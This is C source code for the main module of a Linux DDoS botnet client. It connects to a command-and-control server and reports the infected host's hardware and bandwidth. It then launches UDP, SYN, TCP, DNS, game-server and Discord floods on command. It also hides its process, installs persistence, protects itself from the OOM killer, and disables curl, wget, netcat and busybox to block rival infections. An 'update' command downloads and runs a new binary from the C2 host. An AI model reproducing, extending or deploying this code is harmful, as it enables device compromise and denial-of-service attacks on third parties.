#define _GNU_SOURCE
#include "bot.h"
#include "headers/persist.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <netdb.h>
volatile int running = 1;
int g_yield_interval = 5;
int g_thread_count = 4;
static int g_fd = -1;
static int flood_active = 0;
static pthread_mutex_t flood_mutex = PTHREAD_MUTEX_INITIALIZER;

static int connect_server(const char *port) {
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(SERVER_IP, port, &hints, &res) != 0)
        return -1;
    int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd < 0) { freeaddrinfo(res); return -1; }
    struct timeval tv = {300, 0};
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    struct timeval rtv = {120, 0};
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &rtv, sizeof(rtv));
    if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
        close(fd); freeaddrinfo(res); return -1;
    }
    freeaddrinfo(res);
    int flag = 1;
    setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &flag, sizeof(flag));
    return fd;
}

static void write_all(int fd, const uint8_t *buf, int len) {
    while (len > 0) {
        int n = write(fd, buf, len);
        if (n <= 0) return;
        buf += n; len -= n;
    }
}

static int read_line(int fd, char *buf, int max) {
    int i = 0;
    while (i < max - 1) {
        char c;
        if (read(fd, &c, 1) != 1) break;
        if (c == '\n') break;
        buf[i++] = c;
    }
    buf[i] = 0;
    return i;
}

static int start_flood(void) {
    pthread_mutex_lock(&flood_mutex);
    if (flood_active) { pthread_mutex_unlock(&flood_mutex); return 0; }
    flood_active = 1;
    pthread_mutex_unlock(&flood_mutex);
    return 1;
}

static void end_flood(void) {
    pthread_mutex_lock(&flood_mutex);
    flood_active = 0;
    pthread_mutex_unlock(&flood_mutex);
}

typedef struct { const char *method; const char *target; int port; int sec; } flood_args;
static flood_args *make_args(const char *m, const char *t, int p, int s) {
	flood_args *a = malloc(sizeof(flood_args));
	a->method = strdup(m); a->target = strdup(t); a->port = p; a->sec = s; return a;
}

static void *flood_thread(void *arg) {
	flood_args *a = arg;
	if (!start_flood()) { free((void*)a->method); free((void*)a->target); free(a); return NULL; }
	if (!strcmp(a->method, "udp")) flood_udp(a->target, a->port, a->sec);
	else if (!strcmp(a->method, "udp-bypass")) flood_udpbypass(a->target, a->port, a->sec);
	else if (!strcmp(a->method, "pps") || !strcmp(a->method, "udp-pps")) flood_pps(a->target, a->port, a->sec);
	else if (!strcmp(a->method, "tcp")) flood_tcp(a->target, a->port, a->sec);
	else if (!strcmp(a->method, "tcp-bypass")) flood_tcpbypass(a->target, a->port, a->sec);
	else if (!strcmp(a->method, "tcp-stomp")) flood_tcpstomp(a->target, a->port, a->sec);
	else if (!strcmp(a->method, "syn")) flood_syn(a->target, a->port, a->sec);
	else if (!strcmp(a->method, "ack")) flood_ack(a->target, a->port, a->sec);
	else if (!strcmp(a->method, "dns")) flood_dns(a->target, a->port, a->sec);
	else if (!strcmp(a->method, "fortnite")) flood_fortnite(a->target, a->port, a->sec);
	else if (!strcmp(a->method, "minecraft")) flood_minecraft(a->target, a->port, a->sec);
	else if (!strcmp(a->method, "ssh")) flood_ssh(a->target, a->port, a->sec);
	else if (!strcmp(a->method, "discord")) flood_discord(a->target, a->port, a->sec);
	end_flood();
	free((void*)a->method); free((void*)a->target); free(a); return NULL;
}

static const char *get_bin_name(void) {
#ifdef __x86_64__
    return "l4_x86_64";
#elif __i386__
    return "l4_x86";
#elif __arm__
    #if defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7M__)
        return "l4_armv7l";
    #elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__)
        return "l4_armv6l";
    #elif defined(__ARM_ARCH_5__) || defined(__ARM_ARCH_5T__)
        return "l4_armv5l";
    #elif defined(__ARM_ARCH_4__) || defined(__ARM_ARCH_4T__)
        return "l4_armv4l";
    #else
        return "l4_armv7l";
    #endif
#elif __mips__
    #ifdef __MIPSEL__
        return "l4_mipsel";
    #else
        return "l4_mips";
    #endif
#elif __powerpc64__ || __ppc64__
    return "l4_ppc64";
#elif __powerpc__ || __ppc__
    return "l4_ppc";
#else
    return "l4_x86_64";
#endif
}

static const char *lock_paths[] = {
    "/usr/bin/curl","/bin/curl","/usr/local/bin/curl",
    "/usr/bin/wget","/bin/wget","/usr/local/bin/wget",
    "/usr/bin/wget2","/usr/bin/ftp","/bin/ftp",
    "/usr/bin/ftpget","/bin/ftpget",
    "/usr/bin/tftp","/bin/tftp",
    "/usr/bin/scp","/bin/scp",
    "/usr/bin/nc","/bin/nc","/usr/bin/netcat","/bin/netcat",
    "/usr/bin/socat","/bin/socat",
    "/usr/bin/axel","/usr/bin/aria2c",
    "/usr/bin/rsync","/bin/rsync",
    "/usr/bin/openssl","/bin/openssl",
    "/usr/bin/sftp","/bin/sftp",
    "/data/local/tmp/curl",
    "/bin/busybox",
};

static void lock(void) {
    for (int i = 0; i < (int)(sizeof(lock_paths)/sizeof(lock_paths[0])); i++) {
        struct stat st;
        if (lstat(lock_paths[i], &st) == 0) {
            if (S_ISLNK(st.st_mode))
                unlink(lock_paths[i]);
            else
                chmod(lock_paths[i], 0);
        }
    }
}

static void unlock(void) {
    for (int i = 0; i < (int)(sizeof(lock_paths)/sizeof(lock_paths[0])); i++) {
        struct stat st;
        if (lstat(lock_paths[i], &st) == 0) {
            if (!S_ISLNK(st.st_mode))
                chmod(lock_paths[i], 0755);
        }
    }
}

static double run_speedtest(void) {
    const char *targets[] = {"1.1.1.1", "1.0.0.1", "8.8.8.8", "8.8.4.4", "9.9.9.9"};
    struct sockaddr_in addrs[5];
    for (int i = 0; i < 5; i++) {
        memset(&addrs[i], 0, sizeof(addrs[i]));
        addrs[i].sin_family = AF_INET;
        addrs[i].sin_port = htons(80);
        if (inet_pton(AF_INET, targets[i], &addrs[i].sin_addr) != 1)
            return 0;
    }
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return 0;
    uint8_t buf[1400];
    memset(buf, 0x41, 1400);
    uint64_t total = 0;
    time_t end = time(NULL) + 2;
    int idx = 0;
    while (time(NULL) < end) {
        sendto(fd, buf, 1400, 0, (struct sockaddr*)&addrs[idx], sizeof(addrs[idx]));
        total += 1400;
        idx = (idx + 1) % 5;
    }
    close(fd);
    return (double)total * 8.0 / 2000000.0;
}

static int http_get(const char *url, const char *output) {
    const char *host, *path;
    if (strncmp(url, "http://", 7) == 0) url += 7;
    host = url;
    path = strchr(host, '/');
    if (!path) path = "/";
    char hostname[256];
    int hlen = path - host;
    if (hlen > 255) hlen = 255;
    memcpy(hostname, host, hlen);
    hostname[hlen] = 0;

    struct hostent *he = gethostbyname(hostname);
    if (!he) return -1;

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    addr.sin_addr = *(struct in_addr*)he->h_addr;
    struct timeval tv = {10, 0};
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(fd); return -1;
    }

    char req[1024];
    int rlen = snprintf(req, sizeof(req),
        "GET %s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n",
        path, hostname);
    write(fd, req, rlen);

    uint8_t hbuf[4096];
    int hpos = 0, n, body_start = -1;
    while (hpos < (int)sizeof(hbuf) && (n = read(fd, hbuf + hpos, sizeof(hbuf) - hpos)) > 0) {
        hpos += n;
        for (int i = 0; i <= hpos - 4; i++) {
            if (hbuf[i] == '\r' && hbuf[i+1] == '\n' &&
                hbuf[i+2] == '\r' && hbuf[i+3] == '\n') {
                body_start = i + 4;
                goto headers_done;
            }
        }
    }
headers_done:
    if (body_start < 0) { close(fd); return -1; }
    if (hpos < 16 || memcmp(hbuf, "HTTP/1.", 7) != 0) { close(fd); return -1; }
    int si = 8;
    while (hbuf[si] == ' ' && si < hpos) si++;
    int status = 0;
    while (si < hpos && hbuf[si] >= '0' && hbuf[si] <= '9') {
        status = status * 10 + (hbuf[si] - '0'); si++;
    }
    if (status != 200) { close(fd); return -1; }

    int tfd = open(output, O_WRONLY|O_CREAT|O_TRUNC, 0755);
    if (tfd < 0) { close(fd); return -1; }

    write(tfd, hbuf + body_start, hpos - body_start);
    while ((n = read(fd, hbuf, sizeof(hbuf))) > 0) write(tfd, hbuf, n);

    close(fd); close(tfd);
    return 0;
}

static void dispatch_cmd(char *line) {
	if (!line || !*line) return;
	char *args[16];
	int argc = 0;
	char *p = line;
	while (*p && argc < 16) {
		while (*p == ' ') p++;
		if (!*p) break;
		args[argc++] = p;
		while (*p && *p != ' ') p++;
		if (*p) { *p = 0; p++; }
	}
	if (argc < 1) return;

	if (!strcmp(args[0], "stop")) {
		if (argc < 2) return;
		running = 0;
		return;
	}

	if (!strcmp(args[0], "update")) {
		unlock();
		char upd_url[512];
		if (argc < 2) {
			snprintf(upd_url, sizeof(upd_url), "http://%s/%s", SERVER_IP, get_bin_name());
		} else {
			snprintf(upd_url, sizeof(upd_url), "%s", args[1]);
		}
		char tmp[] = "/tmp/.upd";
		if (http_get(upd_url, tmp) == 0) {
			struct stat st;
			if (stat(tmp, &st) == 0 && st.st_size > 4096) {
				if (g_fd >= 0) write(g_fd, "UPDATE_OK\n", 10);
				chmod(tmp, 0755);
				execl(tmp, tmp, NULL);
				_exit(0);
			}
		}
		lock();
		if (g_fd >= 0) write(g_fd, "UPDATE_FAIL\n", 12);
		unlink(tmp);
		return;
	}

	if (argc < 4) return;
	const char *method = args[0], *target = args[1];
	int port = atoi(args[2]), sec = atoi(args[3]);
	if (sec < 1) sec = 86400;
	running = 1;

	char m_copy[64], t_copy[256];
	snprintf(m_copy, sizeof(m_copy), "%s", method);
	snprintf(t_copy, sizeof(t_copy), "%s", target);
	flood_args *a = make_args(m_copy, t_copy, port, sec);
	pthread_t t;
	pthread_create(&t, NULL, flood_thread, a);
	pthread_detach(t);
}

int main(int argc, char **argv) {
    signal(SIGPIPE, SIG_IGN);

    /* Save variant BEFORE hide() zeroes argv */
    char variant_buf[256] = {0};
    if (argc >= 2 && strlen(argv[1]) > 0)
        strncpy(variant_buf, argv[1], sizeof(variant_buf)-1);

    hide(argc, argv);
    start_killer();

    FILE *oom = fopen("/proc/self/oom_score_adj", "w");
    if (oom) { fprintf(oom, "-1000\n"); fclose(oom); }

    persist();
    lock();

    long total_ram_mb = 0, total_disk_mb = 0;
    FILE *mf = fopen("/proc/meminfo", "r");
    if (mf) {
        char line[128];
        while (fgets(line, sizeof(line), mf)) {
            if (sscanf(line, "MemTotal: %ld kB", &total_ram_mb) == 1) {
                total_ram_mb /= 1024;
                break;
            }
        }
        fclose(mf);
    }
    if (total_ram_mb <= 0) {
        long pages = sysconf(_SC_PHYS_PAGES);
        long psize = sysconf(_SC_PAGE_SIZE);
        if (pages > 0 && psize > 0)
            total_ram_mb = pages * psize / (1024 * 1024);
    }

    struct statvfs svfs;
    if (statvfs("/", &svfs) == 0 && svfs.f_blocks > 0)
        total_disk_mb = (long)(svfs.f_blocks * svfs.f_frsize / (1024 * 1024));
    if (total_disk_mb <= 0) {
        if (statvfs("/data", &svfs) == 0 && svfs.f_blocks > 0)
            total_disk_mb = (long)(svfs.f_blocks * svfs.f_frsize / (1024 * 1024));
    }

    long cores = sysconf(_SC_NPROCESSORS_ONLN);
    { /* Scale threads and yield based on CPU count */
        if (cores < 1) cores = 1;
        g_thread_count = (int)(cores * 4);
        if (g_thread_count < 4) g_thread_count = 4;
        if (g_thread_count > 64) g_thread_count = 64;
        g_yield_interval = cores == 1 ? 5 : (int)(cores * 10);
        if (g_yield_interval > 100) g_yield_interval = 100;
    }

    const char *variant = NULL;
    if (variant_buf[0]) variant = variant_buf;
    if (!variant) variant = "unknown";
    double speed_mbps = run_speedtest();

    while (1) {
        int fd = connect_server(CNC_PORT);
        if (fd < 0) { sleep(5); continue; }

        char reg[512];
        snprintf(reg, sizeof(reg), "REGISTER linux %s %d %ld %ld l4 %.0f %s\n",
#ifdef __x86_64__
                "x86_64",
#elif __i386__
                "i686",
#elif __arm__
                "armv7l",
#elif __mips__
                "mips",
#else
                "unknown",
#endif
                (int)cores, total_ram_mb, total_disk_mb, speed_mbps, variant
        );
        write_all(fd, (uint8_t*)reg, strlen(reg));

        g_fd = fd;
        char buf[4096];
        while (read_line(fd, buf, sizeof(buf)) > 0) {
            dispatch_cmd(buf);
        }
        close(fd);
        g_fd = -1;
        sleep(5);
    }
    return 0;
}

// PRNG
XorShift64 *rng_new(void) {
    XorShift64 *r = malloc(sizeof(XorShift64));
    r->state = 88172645463325252ULL ^ (uint64_t)time(NULL) ^ (uint64_t)(uintptr_t)pthread_self();
    return r;
}
uint64_t rng_next(XorShift64 *r) {
    r->state ^= r->state << 13;
    r->state ^= r->state >> 17;
    r->state ^= r->state << 5;
    return r->state;
}
void rng_fill(XorShift64 *r, uint8_t *buf, int len) {
    int i = 0;
    while (i + 8 <= len) {
        uint64_t v = rng_next(r);
        buf[i++] = v; buf[i++] = v >> 8; buf[i++] = v >> 16; buf[i++] = v >> 24;
        buf[i++] = v >> 32; buf[i++] = v >> 40; buf[i++] = v >> 48; buf[i++] = v >> 56;
    }
    if (i < len) {
        uint64_t v = rng_next(r);
        while (i < len) { buf[i] = v; v >>= 8; i++; }
    }
}
